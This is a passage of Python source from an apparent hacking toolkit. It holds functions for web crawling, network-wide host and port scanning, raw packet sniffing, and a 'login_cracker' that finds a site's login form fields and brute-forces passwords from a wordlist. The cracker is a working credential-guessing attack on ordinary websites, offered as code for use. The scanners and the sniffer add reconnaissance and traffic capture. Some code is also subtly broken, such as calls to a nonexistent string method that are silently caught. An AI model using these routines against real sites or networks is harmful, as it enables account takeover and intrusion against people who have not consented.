    global host_up_list

    my_socket = socket.socket()
    my_socket.settimeout(1)

    my_ip = str(i) + "." + str(ii) + "." + str(iii) + "." + str(iv)

    try:
        my_socket.connect((my_ip, port))
        host_up_list.append(my_ip)

    except ConnectionRefusedError:
        host_up_list.append(my_ip)
        
    except OSError:
        pass

    except TimeoutError:
        host_up_list.append(my_ip)

#crawls a website looking for links
def link_scanner(url, secure = True, my_file = " "):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    my_url = my_secure + url
    tracker = 0

    website_list = []
    website_list.append(my_url)

    clear()

    while True:
        length_count = 0

        website_list = list(dict.fromkeys(website_list))
        
        try:
            my_filter = re.findall("(https://|http://)(.+?/)", website_list[tracker])
            find_my = re.search(url, str(my_filter))

            if find_my or website_list[tracker] == my_url:
                stream_boolean = web_session.get(website_list[tracker], verify = False, headers = user_agent, timeout = (5, 30), stream = True)

                for i in stream_boolean.iter_lines():
                    length_count += len(i)

                if length_count > 100000000:
                    print(red + "too long" + ": " + str(website_list[tracker]))
                    website_list.pop(tracker)

                if length_count <= 100000000:
                    status = web_session.get(website_list[tracker], verify = False, headers = user_agent, timeout = (5, 30)).status_code

                    if status == 200:
                        print(red + website_list[tracker])
                        my_request = web_session.get(website_list[tracker], verify = False, headers = user_agent, timeout = (5, 30)).text

                        if len(my_request) <= 100000000:
                            tracker += 1

                            #urls
                            website = re.findall("http://|https://\S+", my_request)
                            website = list(dict.fromkeys(website))

                            for i in website:
                                try:
                                    result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                    result = result[0]
                                    result = re.sub("[\"\']", "", result)

                                except:
                                    result = i
                                    
                                if url in i:
                                    website_list.append(re.sub("[\\\"\']", "", result))

                            #href
                            href = re.sub(" ", "", my_request)
                            href = re.findall("href\s*=\s*[\"\']\S+?[\'\"]", href)
                            href = list(dict.fromkeys(href))
                            for i in href:
                                try:
                                    i = i.clean(" ", "")
                                    result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                    result = result[0]

                                except:
                                    result = i
                                
                                result = re.sub("[\\\"\';=\s]|href", "", i)

                                if result.startswith("http"):
                                    if url in result:
                                        website_list.append(result)

                                if result.startswith("http") == False and result[0] != "/":
                                    result = re.sub(url, "", result)
                                    result = re.sub("www", "", result)
                                    website_list.append(my_url + "/" + result)

                                if result.startswith("http") == False and result[0] == "/":
                                    result = re.sub(url, "", result)
                                    result = re.sub("www", "", result)
                                    website_list.append(my_url + result)

                            #action
                            action = re.sub(" ", "", my_request)
                            action = re.findall("action\s*=\s*[\"\']\S+?[\'\"]", action)
                            action = list(dict.fromkeys(action))
                            
                            for i in action:
                                try:
                                    i = i.clean(" ", "")
                                    result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                    result = result[0]

                                except:
                                    result = i
                                    
                                result = re.sub("[\\\"\';=\s]|action", "", i)

                                if result.startswith("http"):
                                    if url in result:
                                        website_list.append(result)

                                if result.startswith("http") == False and result[0] != "/":
                                    result = re.sub(url, "", result)
                                    result = re.sub("www", "", result)
                                    website_list.append(my_url + "/" + result)

                                if result.startswith("http") == False and result[0] == "/":
                                    result = re.sub(url, "", result)
                                    result = re.sub("www", "", result)
                                    website_list.append(my_url + result)

                            #src
                            src = re.sub(" ", "", my_request)
                            src = re.findall("src\s*=\s*[\"\']\S+?[\'\"]", src)
                            src = list(dict.fromkeys(src))

                            for i in src:
                                try:
                                    i = i.clean(" ", "")
                                    result = re.split("[%\(\)<>\[\],\{\};�|]", i)
                                    result = result[0]

                                except:
                                    result = i
                                    
                                result = re.sub("[\\\"\';=\s]|src", "", i)
                                
                                if result.startswith("http"):
                                    if url in result:
                                        website_list.append(result)

                                if result.startswith("http") == False and result[0] != "/":
                                    result = re.sub(url, "", result)
                                    result = re.sub("www", "", result)
                                    website_list.append(my_url + "/" + result)

                                if result.startswith("http") == False and result[0] == "/":
                                    result = re.sub(url, "", result)
                                    result = re.sub("www", "", result)
                                    website_list.append(my_url + result)

                            #slash
                            slash = re.findall("[\'|\"]/\S+[\"|\']", my_request)

                            for i in slash:
                                my_search = re.search("http|\.com|\.edu|\.net|\.org|\.tv|www|http", i)

                                if not my_search:
                                    result = re.sub("[\"\']", "", i)
                                    result = re.split("[%\(\)<>\[\],\{\};�|]", result)
                                    result = result[0]
                                    website_list.append(my_url + result)

                    else:
                        print(red + str(status) + ": " + str(website_list[tracker]))
                        website_list.pop(tracker)

            if not find_my:
                website_list.pop(tracker)

        except IndexError:
            break

        except:
            print(red + "ERROR: " + str(website_list[tracker]))
            website_list.pop(tracker)


    website_list = list(dict.fromkeys(website_list))
    website_list.sort()

    clear()

    if my_file != " ":
        with open(my_file, "a") as file:
            for i in website_list:
                file.write(i + "\n")

    return website_list

#scans for hyperlinks using selenium
def link_scanner_selenium(url):
    result = "http://" + url
    
    driver = webdriver.Firefox(service = Service(GeckoDriverManager().install()))

    i = -1
    total_web_list = []
    total_web_list.append(result)
    web_list = []

    while True:
        i = i + 1
        
        try:
            print(red + total_web_list[i])
            driver.get(total_web_list[i])

        except IndexError:
            break

        except:
            continue
        
        try:
            for ii in driver.find_elements(by = By.XPATH, value = ".//a"):
                web_list.append(ii.get_attribute("href"))

        except:
            pass

        web_list = list(dict.fromkeys(web_list))

        for iii in web_list:
            try:
                domain_name = result in iii

                parse = iii.index(result, 0, len(result))
                
                if domain_name == True and parse == 0:
                    total_web_list.append(iii)
                    total_web_list = list(dict.fromkeys(total_web_list))

            except:
                continue

    total_web_list = list(dict.fromkeys(total_web_list))
    total_web_list.sort()

    clear()

    return total_web_list

#attempts to login using a dictionary attack
def login_cracker(url, user_name = "", word_list = " ", secure = True):
    global password_list

    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    my_url = my_secure + url

    form_data = form_scanner(url, parse = "input", secure = False)

    clear()

    text = False
    passcode = False
    submit = False

    if word_list != " ":
        for i in form_data:
            if "text" in i:
                try:
                    user = re.findall("(name=\")(\S+)(\")", i)
                    user = user[0][1]
                    text = True

                except:
                    pass

            if "password" in i:
                try:
                    password = re.findall("(name=\")(\S+)(\")", i)
                    password = password[0][1]
                    passcode = True

                except:
                    pass

            if "submit" in i:
                try:
                    submit_name = re.findall("(name=\")(\S+)(\")", i)
                    print(submit_name)
                    submit_name = submit_name[0][1]
                    submit_value = re.findall("(value=\")(\S+)(\")", i)
                    submit_value = submit_value[0][1]
                    submit = True

                except:
                    pass

        with open(word_list, "r") as f:
            for i in f:
                key = i.replace("\n", "")

                if text == True and passcode == True and submit == True:
                    payload = {user : user_name, password : key, submit_name : submit_value}

                if text == True and passcode == True and submit == False:
                    payload = {user : user_name, password : key}

                if text == False and passcode == True and submit == False:
                    payload = {password : key}

                if text == False and passcode == True and submit == True:
                    payload = {password : key, submit_name : submit_value}

                try:
                    result = web_session.post(my_url, data = payload, verify = False, headers = user_agent, timeout = (5, 30)).url
                    verify = web_session.get(result, verify = False, headers = user_agent, timeout = (5, 30)).text

                    print(payload)

                    if "type=\"password\"" not in verify.lower():
                        print("True: " + key)
                        break

                    if "type=\"password\"" in verify.lower():
                        print("False: "+ key)

                except:
                    print("ERROR!")
                    break

    if word_list == " ":
        for i in form_data:
            if "text" in i:
                try:
                    user = re.findall("(name=\")(\S+)(\")", i)
                    user = user[0][1]
                    text = True

                except:
                    pass

            if "password" in i:
                try:
                    password = re.findall("(name=\")(\S+)(\")", i)
                    password = password[0][1]
                    passcode = True

                except:
                    pass

            if "submit" in i:
                try:
                    submit_name = re.findall("(name=\")(\S+)(\")", i)
                    submit_name = submit_name[0][1]
                    submit_value = re.findall("(value=\")(\S+)(\")", i)
                    submit_value = submit_value[0][1]
                    submit = True

                except:
                    pass

        for key in password_list:
            if text == True and passcode == True and submit == True:
                payload = {user : user_name, password : key, submit_name : submit_value}

            if text == True and passcode == True and submit == False:
                payload = {user : user_name, password : key}

            if text == False and passcode == True and submit == False:
                payload = {password : key}

            if text == False and passcode == True and submit == True:
                payload = {password : key, submit_name : submit_value}

            try:
                result = web_session.post(my_url, data = payload, verify = False, headers = user_agent, timeout = (5, 30)).url
                verify = web_session.get(result, verify = False, headers = user_agent, timeout = (5, 30)).text

                if "type=\"password\"" not in verify.lower():
                        print("True: " + key)
                        break

                if "type=\"password\"" in verify.lower():
                    print("False: "+ key)

            except:
                print("ERROR!")
                break

#scan entire network
def nmap():
    global host_up_list
    global nmap_list

    host_up_list = []
    nmap_list = []
    
    my_list = []

    clear()

    user_input = input("1 = 192 | 2 = 172 | 3 = 10\n")

    clear()

    print(red + "scanning")

    if user_input == "1":
        for i in range(192, 193):
            for ii in range(168, 169):
                for iii in range(0, 255):
                    for iv in range(0, 255):
                        my_thread = threading.Thread(target = host_up, args = (80, i, ii, iii, iv,))
                        my_thread.start()
                        time.sleep(0.001)

        print(str(len(host_up_list)) + " potential hosts up")
                            
        for my_ip in host_up_list:
            for port in range(1, 65537):
                my_thread = threading.Thread(target = nmap_thread, args = (my_ip, port,))
                my_thread.start()
                time.sleep(0.001)

    if user_input == "2":
        for i in range(172, 173):
            for ii in range(16, 32):
                for iii in range(0, 255):
                    for iv in range(0, 255):
                        my_thread = threading.Thread(target = host_up, args = (80, i, ii, iii, iv,))
                        my_thread.start()
                        time.sleep(0.001)

        print(str(len(host_up_list)) + " potential hosts up")
                        
        for my_ip in host_up_list:
            for port in range(1, 65537):
                my_thread = threading.Thread(target = nmap_thread, args = (my_ip, port,))
                my_thread.start()
                time.sleep(0.001)

    if user_input == "3":
        for i in range(10, 11):
            for ii in range(0, 255):
                for iii in range(0, 255):
                    for iv in range(0, 255):
                        my_thread = threading.Thread(target = host_up, args = (80, i, ii, iii, iv,))
                        my_thread.start()
                        time.sleep(0.001)

        print(str(len(host_up_list)) + " potential hosts up")
                        
        for my_ip in host_up_list:
            for port in range(1, 65537):
                my_thread = threading.Thread(target = nmap_thread, args = (my_ip, port,))
                my_thread.start()
                time.sleep(0.001)

    nmap_list = list(dict.fromkeys(nmap_list))
    nmap_list.sort()

    for i in nmap_list:
        print(i)
        
def nmap_thread(my_ip, port):
    my_socket = socket.socket()
    my_socket.settimeout(1)

    port_dict = {1:"tcpmux",2:"compressnet-management-utility",3:"compressnet-compression-process",5:"remote-job-entry",7:"echo",9:"discard",11:"active-users",13:"daytime",17:"qotd",18:"message-send",19:"chargen",20:"ftp-data",21:"ftp-command",22:"ssh",23:"telnet",25:"smtp",27:"nsw-user-system-fe",29:"msg-icp",31:"msg-auth",33:"dsp",37:"time",38:"rap/rlp",41:"graphics",42:"host-name-server",43:"whois",44:"mpm-flags",45:"mpm",46:"mpm-snd",48:"auditd",49:"tacacs",50:"re-mail-ck",52:"xns-time",53:"dns",54:"xns-name-server",55:"isi-graphics-language",56:"xns-authentication",58:"xns-mail",62:"acas",63:"whois++",64:"covia",65:"tacacs-ds",66:"sql-net",67:"dhcp",68:"dhcp",69:"tftp",70:"gopher",71:"netrjs",72:"netrjs",73:"netrjs",74:"netrjs",76:"deos",78:"vettcp",79:"finger",80:"http",82:"xfer",83:"mit-ml-dev",84:"common-trace-facility",85:"mit-ml-dev",86:"micro-focus-cobol",88:"kerberos",89:"su/mit-telnet-gateway",90:"dnsix",91:"mit-dov",92:"network-printing",93:"device-control",94:"objcall",95:"supdup-terminal-independent-remote-login",96:"dixie",97:"swift-rvf",98:"tacnews",99:"metagram",101:"nic",102:"tsap",104:"dicom",105:"ccso-nameserver",107:"rtelnet",108:"ibm-systems-network-architecture",109:"pop2",110:"pop3",111:"sun-rpc",113:"authentication-service/identification-protocol",115:"sftp",117:"uucp-mapping-project",118:"sql-services",119:"nntp",123:"ntp",137:"netbios-ns",443:"https",853:"dns-over-tls",3001:"nessus",8080:"http-proxy",8443:"https-proxy",9050:"tor",9051:"tor",19132:"minecraft-bedrock-server-ipv4",19133:"minecraft-bedrock-server-ipv6",62072:"iphone-sync",62078:"iphone-sync"}
    
    try:
        my_socket.connect((my_ip, port))

        try:
            nmap_list.append(my_ip + ": " + str(port) + " open " + port_dict[port])

        except:
            nmap_list.append(my_ip + ": " + str(port) + " open unknown" )

    except:
        pass
    
#capture packets like wireshark (requires linux)
def packet_sniffer(protocol = " ", data = False, parse = " ", hex_dump = False, ip = " "):
    clear()

    cyan = "\033[1;36m"
    green = "\033[0;32m"

    my_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))

    while True:
        try:
            packet = my_socket.recvfrom(65536)

            #data
            data_hex = binascii.hexlify(packet[0])
            data_hex = str(data_hex).replace("b'", "")
            data_hex = data_hex.replace("'", "")

            data_ascii = codecs.decode(packet[0], errors = "replace")
            
            #mac stuff
            mac_destination = struct.unpack("!6s", packet[0][0:6])
            super_mac_destination = binascii.hexlify(mac_destination[0])
            super_mac_destination = str(super_mac_destination).replace("b'", "")
            super_mac_destination = super_mac_destination.replace("'", "")

            mac_source = struct.unpack("!6s", packet[0][6:12])
            super_mac_source = binascii.hexlify(mac_source[0])
            super_mac_source = str(super_mac_source).replace("b'", "")
            super_mac_source = super_mac_source.replace("'", "")

            #protocol
            my_protocol = struct.unpack("!1s", packet[0][23:24])
            super_protocol = binascii.hexlify(my_protocol[0])
            super_protocol = str(super_protocol).replace("b'", "")
            super_protocol = super_protocol.replace("'", "")

            proto = super_protocol

            if super_protocol == "00":
                proto = "HOPOPT"

            if super_protocol == "01":
                proto = "ICMP"

            if super_protocol == "02":
                proto = "IGMP"

            if super_protocol == "03":
                proto = "GGP"

            if super_protocol == "04":
                proto = "IP-in-IP"

            if super_protocol == "05":
                proto = "ST"
            
            if super_protocol == "06":
                proto = "TCP"

            if super_protocol == "07":
                proto = "CBT"

            if super_protocol == "08":
                proto = "EGP"

            if super_protocol == "09":
                proto = "IGP"

            if super_protocol == "0a":
                proto = "BBN-RCC-MON"

            if super_protocol == "0b":
                proto = "NVP-II"

            if super_protocol == "0c":
                proto = "PUP"

            if super_protocol == "0d":
                proto = "ARGUS"

            if super_protocol == "0e":
                proto = "EMCON"

            if super_protocol == "0f":
                proto = "XNET"

            if super_protocol == "10":
                proto = "CHAOS"

            if super_protocol == "11":
                proto = "UDP"

            if super_protocol == "12":
                proto = "MUX"

            if super_protocol == "13":
                proto = "DCN-MEAS"

            if super_protocol == "14":
                proto = "HMP"

            if super_protocol == "15":
                proto = "PRM"

            if super_protocol == "16":
                proto = "XNS-IDP"

            if super_protocol == "17":
                proto = "TRUNK-1"

            if super_protocol == "18":
                proto = "TRUNK-2"

            if super_protocol == "19":
                proto = "LEAF-1"

            if super_protocol == "1a":
                proto = "LEAF-2"

            if super_protocol == "1b":
                proto = "RDP"

            if super_protocol == "1c":
                proto = "IRTP"

            if super_protocol == "1d":
                proto = "ISO-TP4"

            if super_protocol == "1e":
                proto = "NETBLT"

            if super_protocol == "1f":
                proto = "MFE-NSP"

            if super_protocol == "20":
                proto = "MERIT-INP"

            if super_protocol == "21":
                proto = "DCCP"

            if super_protocol == "22":
                proto = "3PC"

            if super_protocol == "23":
                proto = "IDPR"

            if super_protocol == "24":
                proto = "XTP"

            if super_protocol == "25":
                proto = "DDP"

            if super_protocol == "26":
                proto = "IDPR-CMTP"

            if super_protocol == "27":
                proto = "TP++"

            if super_protocol == "28":
                proto = "IL"

            if super_protocol == "29":
                proto = "IPv6"

            if super_protocol == "2a":
                proto = "SDRP"

            if super_protocol == "2b":
                proto = "IPv6-Route"

            if super_protocol == "2c":
                proto = "IPv6-Frag"

            if super_protocol == "2d":
                proto = "IDRP"

            if super_protocol == "2e":
                proto = "RSVP"

            if super_protocol == "2f":
                proto = "GRE"

            if super_protocol == "30":
                proto = "DSR"

            if super_protocol == "31":
                proto = "BNA"

            if super_protocol == "32":
                proto = "ESP"

            if super_protocol == "33":
                proto = "AH"

            if super_protocol == "34":
                proto = "I-NLSP"

            if super_protocol == "35":
                proto = "SwIPe"

            if super_protocol == "36":
                proto = "NARP"

            if super_protocol == "37":
                proto = "MOBILE"

            if super_protocol == "38":
                proto = "TLSP"

            if super_protocol == "39":
                proto = "SKIP"

            if super_protocol == "3a":
                proto = "IPv6-ICMP"

            if super_protocol == "3b":
                proto = "IPv6-NoNxt"

            if super_protocol == "3c":
                proto = "IPv6-Opts"

            if super_protocol == "3d":
                proto = "3d"

            if super_protocol == "3e":
                proto = "CFTP"

            if super_protocol == "3f":
                proto = "3f"

            if super_protocol == "40":
                proto = "SAT-EXPAK"

            if super_protocol == "41":
                proto = "KRYPTOLAN"

            if super_protocol == "42":
                proto = "RVD"

            if super_protocol == "43":
                proto = "IPPC"

            if super_protocol == "44":
                proto = "44"

            if super_protocol == "45":
                proto = "SAT-MON"

            if super_protocol == "46":
                proto = "VISA"

            if super_protocol == "47":
                proto = "IPCU"

            if super_protocol == "48":
                proto = "CPNX"

            if super_protocol == "49":
                proto = "CPHB"

            if super_protocol == "4a":
                proto = "WSN"

            if super_protocol == "4b":
                proto = "PVP"

            if super_protocol == "4c":
                proto = "BR-SAT-MON"

            if super_protocol == "4d":
                proto = "SUN-ND"

            if super_protocol == "4e":
                proto = "WB-MON"

            if super_protocol == "4f":
                proto = "WB-EXPAK"

            if super_protocol == "50":
                proto = "ISO-IP"

            if super_protocol == "51":
                proto = "VMTP"

            if super_protocol == "52":
                proto = "SECURE-VMTP"

            if super_protocol == "53":
                proto = "VINES"

            if super_protocol == "54":
                proto = "TTP"

            if super_protocol == "55":
                proto = "NSFNET-IGP"

            if super_protocol == "56":
                proto = "DGP"

            if super_protocol == "57":
                proto = "TCF"

            if super_protocol == "58":
                proto = "EIGRP"

            if super_protocol == "59":
                proto = "OSPF"

            if super_protocol == "5a":
                proto = "Sprite-RPC"

            if super_protocol == "5b":
                proto = "LARP"

            if super_protocol == "5c":
                proto = "MTP"

            if super_protocol == "5d":
                proto = "AX.25"

            if super_protocol == "5e":
                proto = "OS"

            if super_protocol == "5f":
                proto = "MICP"

            if super_protocol == "61":
                proto = "ETHERIP"

            if super_protocol == "62":
                proto = "ENCAP"

            #ip stuff
            ip_header = packet[0][26:34]
            super_ip_header = struct.unpack("!4s4s", ip_header)

            #formatting
            destination = socket.inet_ntoa(super_ip_header[1])
            source = socket.inet_ntoa(super_ip_header[0])

            #checksum
            checksum = packet[0][24:26]
            checksum = struct.unpack("!2s", checksum)
            checksum = binascii.hexlify(checksum[0])
            checksum = str(checksum).replace("b'", "")
            checksum = checksum.replace("'", "")

            #protocol header
            source_port = packet[0][34:36]
            source_port = struct.unpack("!2s", source_port)
            source_port = binascii.hexlify(source_port[0])
            source_port = int(source_port, 16)

            destination_port = packet[0][36:38]
            destination_port = struct.unpack("!2s", destination_port)
            destination_port = binascii.hexlify(destination_port[0])
            destination_port = int(destination_port, 16)
            
            if proto == "UDP":
                checksum_protocol_udp = packet[0][40:42]
                checksum_protocol_udp = struct.unpack("!2s", checksum_protocol_udp)
                checksum_protocol_udp = binascii.hexlify(checksum_protocol_udp[0])
                checksum_protocol_udp = str(checksum_protocol_udp).replace("b'", "")
                checksum_protocol_udp = checksum_protocol_udp.replace("'", "")

            if proto == "TCP":
                try:
                    checksum_protocol_tcp = packet[0][42:44]
                    checksum_protocol_tcp = struct.unpack("!2s", checksum_protocol_tcp)
                    checksum_protocol_tcp = binascii.hexlify(checksum_protocol_tcp[0])
                    checksum_protocol_tcp = str(checksum_protocol_tcp).replace("b'", "")
                    checksum_protocol_tcp = checksum_protocol_tcp.replace("'", "")

                except:
                    pass
                
            #other protocols
            if destination_port == 20 or source_port == 20 or destination_port == 21 or source_port == 21:
                proto = "FTP"

            if destination_port == 22 or source_port == 22:
                proto = "SSH"

            if destination_port == 23 or source_port == 23:
                proto = "TELNET"

            if destination_port == 25 or source_port == 25:
                proto = "SMTP"

            if destination_port == 53 or source_port == 53:
                proto = "DNS"

            if destination_port == 67 or source_port == 67 or destination_port == 68 or source_port == 68:
                proto = "DHCP"
                
            if destination_port == 80 or source_port == 80:
                proto = "HTTP"

            if destination_port == 443 or source_port == 443:
                proto = "HTTPS"

            arp_check = struct.unpack("!2s", packet[0][12:14])
            arp_check = binascii.hexlify(arp_check[0])
            arp_check = str(arp_check).replace("b'", "")
            arp_check = arp_check.replace("'", "")

            if arp_check == "0806":
                proto = "ARP"
            
            #display
            if protocol == " ":
                if source == ip or destination == ip:
                    print(red + "source ip: " + str(source) + " | source mac: " + str(super_mac_source) + " | source port: " + str(source_port))
                    print(red + "destination ip: " + str(destination) + " | destination mac: " + str(super_mac_destination) + " | destination port: " + str(destination_port))
                    print(red + "protocol: " + proto)

                    if proto == "UDP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_udp))

                    if proto == "TCP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_tcp))
                    
                    if data == True:
                        print(cyan + "hex data: " + str(data_hex))
                        print(green + "utf-8 data: " + str(data_ascii))

                    if hex_dump == True:
                        with open("hex dump.txt", "a") as file:
                            file.write(data_hex + "\n")

                    print("")
                    
                if ip  == " ":
                    print(red + "source ip: " + str(source) + " | source mac: " + str(super_mac_source) + " | source port: " + str(source_port))
                    print(red + "destination ip: " + str(destination) + " | destination mac: " + str(super_mac_destination) + " | destination port: " + str(destination_port))
                    print(red + "protocol: " + proto)

                    if proto == "UDP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_udp))

                    if proto == "TCP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_tcp))

                    if data == True:
                        print(cyan + "hex data: " + str(data_hex))
                        print(green + "utf-8 data: " + str(data_ascii))

                    if hex_dump == True:
                        with open("hex dump.txt", "a") as file:
                            file.write(data_hex + "\n")

                    print("")

            if protocol == proto and protocol != "CLEAR":
                if source == ip or destination == ip:
                    print(red + "source ip: " + str(source) + " | source mac: " + str(super_mac_source) + " | source port: " + str(source_port))
                    print(red + "destination ip: " + str(destination) + " | destination mac: " + str(super_mac_destination) + " | destination port: " + str(destination_port))
                    print(red + "protocol: " + proto)

                    if proto == "UDP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_udp))

                    if proto == "TCP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_tcp))
                    
                    if data == True:
                        print(cyan + "hex data: " + str(data_hex))
                        print(green + "utf-8 data: " + str(data_ascii))

                    if hex_dump == True:
                        with open("hex dump.txt", "a") as file:
                            file.write(data_hex + "\n")

                    print("")

                if ip == " ":
                    print(red + "source ip: " + str(source) + " | source mac: " + str(super_mac_source) + " | source port: " + str(source_port))
                    print(red + "destination ip: " + str(destination) + " | destination mac: " + str(super_mac_destination) + " | destination port: " + str(destination_port))
                    print(red + "protocol: " + proto)

                    if proto == "UDP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_udp))

                    if proto == "TCP":
                        print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_tcp))
                            
                    if data == True:
                        print(cyan + "hex data: " + str(data_hex))
                        print(green + "utf-8 data: " + str(data_ascii))

                    if hex_dump == True:
                        with open("hex dump.txt", "a") as file:
                            file.write(data_hex + "\n")
                            
                    print("")

            if protocol == "CLEAR":
                if destination_port == 20 or source_port == 20 or destination_port == 21 or source_port == 21 or destination_port == 23 or source_port == 23 or destination_port == 25 or source_port == 25 or destination_port == 53 or source_port == 53 or destination_port == 67 or source_port == 67 or destination_port == 68 or source_port == 68 or destination_port == 80 or source_port == 80 or destination_port == 443 or source_port == 443:
                    if source == ip or destination == ip:
                        print(red + "source ip: " + str(source) + " | source mac: " + str(super_mac_source) + " | source port: " + str(source_port))
                        print(red + "destination ip: " + str(destination) + " | destination mac: " + str(super_mac_destination) + " | destination port: " + str(destination_port))
                        print(red + "protocol: " + proto)

                        if proto == "UDP":
                            print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_udp))

                        if proto == "TCP":
                            print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_tcp))
                        
                        if data == True:
                            print(cyan + "hex data: " + str(data_hex))
                            print(green + "utf-8 data: " + str(data_ascii))

                        if hex_dump == True:
                            with open("hex dump.txt", "a") as file:
                                file.write(data_hex + "\n")

                        print("")

                    if ip == " ":
                        print(red + "source ip: " + str(source) + " | source mac: " + str(super_mac_source) + " | source port: " + str(source_port))
                        print(red + "destination ip: " + str(destination) + " | destination mac: " + str(super_mac_destination) + " | destination port: " + str(destination_port))
                        print(red + "protocol: " + proto)

                        if proto == "UDP":
                            print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_udp))

                        if proto == "TCP":
                            print(red + "checksum (ip): " + checksum + " | checksum (protocol): " + str(checksum_protocol_tcp))
                                
                        if data == True:
                            print(cyan + "hex data: " + str(data_hex))
                            print(green + "utf-8 data: " + str(data_ascii))

                        if hex_dump == True:
                            with open("hex dump.txt", "a") as file:
                                file.write(data_hex + "\n")
                                
                        print("")

        except:
            print(red + "ERROR!")
            continue
        
#scans for open ports on a server
def port_scanner(url):
    clear()

    port_dict = {1:"tcpmux",2:"compressnet-management-utility",3:"compressnet-compression-process",5:"remote-job-entry",7:"echo",9:"discard",11:"active-users",13:"daytime",17:"qotd",18:"message-send",19:"chargen",20:"ftp-data",21:"ftp-command",22:"ssh",23:"telnet",25:"smtp",27:"nsw-user-system-fe",29:"msg-icp",31:"msg-auth",33:"dsp",37:"time",38:"rap/rlp",41:"graphics",42:"host-name-server",43:"whois",44:"mpm-flags",45:"mpm",46:"mpm-snd",48:"auditd",49:"tacacs",50:"re-mail-ck",52:"xns-time",53:"dns",54:"xns-name-server",55:"isi-graphics-language",56:"xns-authentication",58:"xns-mail",62:"acas",63:"whois++",64:"covia",65:"tacacs-ds",66:"sql-net",67:"dhcp",68:"dhcp",69:"tftp",70:"gopher",71:"netrjs",72:"netrjs",73:"netrjs",74:"netrjs",76:"deos",78:"vettcp",79:"finger",80:"http",82:"xfer",83:"mit-ml-dev",84:"common-trace-facility",85:"mit-ml-dev",86:"micro-focus-cobol",88:"kerberos",89:"su/mit-telnet-gateway",90:"dnsix",91:"mit-dov",92:"network-printing",93:"device-control",94:"objcall",95:"supdup-terminal-independent-remote-login",96:"dixie",97:"swift-rvf",98:"tacnews",99:"metagram",101:"nic",102:"tsap",104:"dicom",105:"ccso-nameserver",107:"rtelnet",108:"ibm-systems-network-architecture",109:"pop2",110:"pop3",111:"sun-rpc",113:"authentication-service/identification-protocol",115:"sftp",117:"uucp-mapping-project",118:"sql-services",119:"nntp",123:"ntp",137:"netbios-ns",443:"https",853:"dns-over-tls",3001:"nessus",8080:"http-proxy",8443:"https-proxy",9050:"tor",9051:"tor",19132:"minecraft-bedrock-server-ipv4",19133:"minecraft-bedrock-server-ipv6",62072:"iphone-sync",62078:"iphone-sync"}
    
    global open_port_list
    open_port_list = []
    
    print(red + "scanning")
    
    for i in range(1, 65537):
        my_thread = threading.Thread(target = port_scanner_thread, args = (url, i,))
        my_thread.start()

    open_port_list = list(dict.fromkeys(open_port_list))
    open_port_list.sort()

    clear()
    
    for i in open_port_list:
        try:
            print(red + "open: " + str(i) + " " + port_dict[i])

        except:
            print(red + "open: " + str(i) + " unknown")

def port_scanner_thread(url, port):
    global my_port_list

    my_list = []
    
    try:
        my_socket = socket.socket()
        my_socket.settimeout(1)
        my_socket.connect((url, port))
        open_port_list.append(port)

    except:
        pass

#scans for a string on a website or webpage
def search_engine_string(url, string, secure = True):
    if secure == True:
        my_secure = "https://"

    if secure == False:
        my_secure = "http://"

    clear()
    user_input = input("1 = scan all | 2 = scan domain\n")
    clear()

    counter = 0

    string_list = []
    web_list = []

    web_list.append(my_secure + url)

    if user_input == "1":
        while True:  
            try:
                done = web_list[counter]

            except IndexError:
                break
            
            try:
                my_request = web_session.get(web_list[counter], headers = user_agent, timeout = (5,30)).text

                if string in my_request:
                    print(red + web_list[counter])
                    string_list.append(web_list[counter])

            except:
                pass

            counter += 1

            if len(my_request) <= 5000000:
                website = re.findall("[^\"\'=]https://|http://|www\S+[$;\"\']", my_request)
                website = list(dict.fromkeys(website))

                for i in website:
                    clean = i.replace('"', " ")
                    clean = clean.replace("'", " ")
                    clean = clean.replace(";", " ")
                    clean = clean.replace("///", " ")
                    clean = clean.replace("\\", "")
                    clean = clean.replace("%", " ")
                    clean = clean.split()

                    
                    try:
                        if "http" not in i:
                            web_list.append(my_secure + clean[0])

                        else:
                            web_list.append(clean[0])

                    except:
                        pass

                web_list = list(dict.fromkeys(web_list))

    if user_input == "2":
        while True:
            try:
                done = web_list[counter]

            except IndexError:
                break
            
            try:
                my_request = web_session.get(web_list[counter], headers = user_agent, timeout = (5,30)).text

                if string in my_request:
                    print(red + web_list[counter])
                    string_list.append(web_list[counter])

            except:
                pass

            counter += 1

            if len(my_request) <= 5000000:
                website = re.findall("[^\"\'=]https://|http://|www\S+[$;\"\']", my_request)
                website = list(dict.fromkeys(website))

                for i in website:
                    if i in url:
                        clean = i.replace('"', " ")
                        clean = clean.replace("'", " ")
                        clean = clean.replace(";", " ")
                        clean = clean.replace("///", " ")
                        clean = clean.replace("\\", "")
                        clean = clean.replace("%", " ")
                        clean = clean.split()

                        try:
                            if "http" not in i:
                                web_list.append(my_secure + clean[0])

                            else:
                                web_list.append(clean[0])

                        except:
                            pass

                href = re.findall("href=\S+", my_request)
                href = list(dict.fromkeys(href))

            for i in href:
                    clean = i.replace('"', "")
                    clean = clean.replace("'", "")
                    clean = clean.replace(";", " ")
                    clean = clean.replace("///", " ")
                    clean = clean.replace("\\", "")
                    clean = clean.replace(">", " ")
                    clean = clean.replace("href=", "")
                    clean = clean.replace("%", " ")
                    clean = clean.split()

                    try:
                        if "http" not in i:
